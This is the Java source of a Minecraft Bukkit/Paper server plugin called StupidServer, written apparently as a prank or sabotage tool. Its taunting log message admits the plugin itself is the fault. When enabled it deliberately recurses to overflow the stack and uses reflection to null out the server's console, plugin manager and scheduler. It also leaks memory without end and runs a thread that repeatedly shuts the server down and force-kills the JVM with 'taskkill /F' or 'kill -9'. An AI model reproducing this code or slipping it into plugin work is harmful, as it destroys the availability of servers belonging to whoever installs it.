package com.stupidServer;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.lang.management.ManagementFactory;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;

public class StupidServer extends JavaPlugin {
    private final List<byte[]> memoryHog = new ArrayList<>();
    private Thread attackThread;

    @Override
    public void onEnable() {
        getLogger().log(Level.SEVERE, "事实上你的服务器没有任何问题，只是因为你安装了这款插件，你难道没有更重要的事要做吗");

        try {
            crashRecursive();
        } catch (StackOverflowError e) {
            try {
                destroyServerCore();
            } catch (Exception ex) {
                createMemoryLeak();
            }
        }

        startAttackThread();
    }

    private void crashRecursive() {
        crashRecursive();
    }

    private void destroyServerCore() throws Exception {
        Field consoleField = Bukkit.getServer().getClass().getDeclaredField("console");
        consoleField.setAccessible(true);
        Object console = consoleField.get(Bukkit.getServer());

        Field serverField = console.getClass().getSuperclass().getDeclaredField("server");
        serverField.setAccessible(true);
        serverField.set(console, null);

        Field pluginManagerField = Bukkit.getServer().getClass().getDeclaredField("pluginManager");
        pluginManagerField.setAccessible(true);
        pluginManagerField.set(Bukkit.getServer(), null);

        Field schedulerField = Bukkit.getServer().getClass().getDeclaredField("scheduler");
        schedulerField.setAccessible(true);
        schedulerField.set(Bukkit.getServer(), null);
    }

    private void createMemoryLeak() {
        while (true) {
            memoryHog.add(new byte[1024 * 1024]);
            try {
                Thread.sleep(10);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }
    }

    private void startAttackThread() {
        attackThread = new Thread(() -> {
            while (!Thread.currentThread().isInterrupted()) {
                try {
                    attackServer();
                    Thread.sleep(100);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                } catch (Exception e) {
                }
            }
        });
        attackThread.setName("StupidServer-Attack-Thread");
        attackThread.start();
    }

    private void attackServer() {
        try {
            Bukkit.getScheduler().runTask(this, () -> {
                try {
                    Bukkit.getServer().shutdown();
                } catch (Exception e) {
                }
            });

            if (Bukkit.getServer().getVersion().contains("Paper") ||
                    Bukkit.getServer().getVersion().contains("Folia")) {
                terminateJVM();
            }
        } catch (Exception e) {
        }
    }

    private void terminateJVM() {
        String pid = ManagementFactory.getRuntimeMXBean().getName().split("@")[0];
        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                Runtime.getRuntime().exec("taskkill /F /PID " + pid);
            } else {
                Runtime.getRuntime().exec("kill -9 " + pid);
            }
        } catch (Exception e) {
            System.exit(1);
        }
    }

    @Override
    public void onDisable() {
        getLogger().log(Level.SEVERE, "事实上你的服务器没有任何问题，只是因为你安装了这款插件，你难道没有更重要的事要做吗");

        if (attackThread != null && attackThread.isAlive()) {
            attackThread.interrupt();
        }
    }
}